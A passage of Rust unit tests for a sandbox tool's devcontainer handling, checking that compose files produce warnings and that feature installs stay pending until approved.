        apply_gated(&dc, &mut sb2, &ctx(), "/w", &approvals_for(&dc));
        assert!(sb2.compose.is_some());
    }

    #[test]
    fn compose_warns_on_mounts_and_ports() {
        let dc = parse_with_dir(
            r#"{ "dockerComposeFile": "c.yml", "service": "app", "forwardPorts": [3000] }"#,
            "/home/u/proj/.devcontainer",
        );
        let mut sb = SandboxConfig::default();
        let warns = apply_to_sandbox(&dc, &mut sb, &ctx());
        assert!(warns.iter().any(|w| w.contains("compose file")));
    }

    #[test]
    fn features_gated_and_stepped() {
        let dc = parse(
            r#"{ "image": "x", "features": { "ghcr.io/devcontainers/features/node:1": {} } }"#,
        )
        .unwrap();
        // Denied → the request pends, no steps.
        let mut sb = SandboxConfig::default();
        let o = apply_gated(&dc, &mut sb, &ctx(), "/w", &Approvals::deny_all());
        assert!(o.pending.iter().any(|r| r.key == "devcontainer.features"));
        assert!(gated_feature_steps(&dc, "root", &Approvals::deny_all()).is_empty());
        // Approved → install steps materialize.
        let steps = gated_feature_steps(&dc, "root", &approvals_for(&dc));
        assert_eq!(steps.len(), 1);
        assert_eq!(steps[0].id, "devcontainer.feature.node");
    }
}
